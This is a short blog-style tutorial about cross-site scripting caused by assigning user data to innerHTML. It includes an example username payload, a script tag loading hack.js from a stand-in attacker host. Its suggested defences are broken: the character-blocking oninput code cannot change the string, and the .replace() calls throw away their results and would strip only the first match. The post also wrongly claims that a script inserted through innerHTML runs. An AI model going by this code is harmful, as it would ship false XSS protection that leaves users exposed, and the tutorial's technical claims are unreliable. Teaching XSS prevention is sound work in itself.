---
title:  "The Problem with innerHTML"
subtitle: "How innerHTML makes your site hackable"
image: "img/posts/the-problem-with-innerHTML.png"
date: 2018-01-20 11:00:00
---

``` javascript
element.innerHTML = "Post by " + username;
```

This simple line of code might seem "innocent" and well written, but it can actually cause quite a bit of trouble.

Imagine you have a website where a user can post a video, similar to Youtube, and when they published a video, it would say "Post by " and then their username under their video.

Their username would be fetched from the backend, and the code above would be used to display the message.

With a regular user this would work perfectly fine, but what if someone wants to hack your website?

What would happen if that person registered an account on your site and made their username ```<script src='http://hackerwebsite.com/hack.js'></script>```?

Well, since you used the innerHTML property, the script in their username would be injected into everyone that viewed that persons video.

Now imagine that hacker made a viral video. Well, millions of people would have that script injected into their computer.

### This sort of hack is called Cross Site Scripting, or XSS for short.

It is the most popular hack on the internet, and has affected millions of websites such as Google, Youtube, and Facebook.

### So, what can you do to protect yourself?

For starters, if there is any data that you are putting in an HTML element via .innerHTML, make sure it is from a trusted source - not a user or other person. If you do have any data from a non-trusted source, you can use the innerText property instead, or the .text() function in jQuery.

Here's the new code:

``` javascript
element.innerText = "Post by " + username;
```

Furthermore, when a user is registering for your site, block characters such as <, >, (, or ), because regular users don't need them for normal usernames, and they tend to be used in injected scripts, as well as HTML elements.

Here's an example of this implemented:

``` javascript
usernameInput.oninput = function(){
  // Last character entered
  var enteredChar = this.value[this.value.length-1];

  // List of blocked characters
  var charsBlocked = ["<",">","(",")"];

  // If entered character is blocked
  if(charsBlocked.indexOf(enteredChar)!=-1){
    // Take away entered character
    this.value[this.value.length-1] = "";
  }
}
```

You can also use the .replace() function to simply delete any occurences of ```<script>``` or ```</script>``` in a string.

For example:

``` javascript
username.replace("<script>", "");
username.replace("</script>", "");
element.innerHTML = "Post by " + username;
```

Cross Site Scripting affects thousands of websites every year.

If your site is vulnerable to XSS attacks, hackers could potentially transmit important data to their servers, such as your entire javascript window object (containing all of your variables and functions), or they could even steal sensitive information such as user passwords, and more.

Whenever you are using .innerHTML, I suggest you check if your site could be vulnerable to XSS attacks, and change your code correspondingly.

### Anyway, thanks for reading!

``` javascript
element.innerText = "This site is not vulnerable to XSS attacks.";
```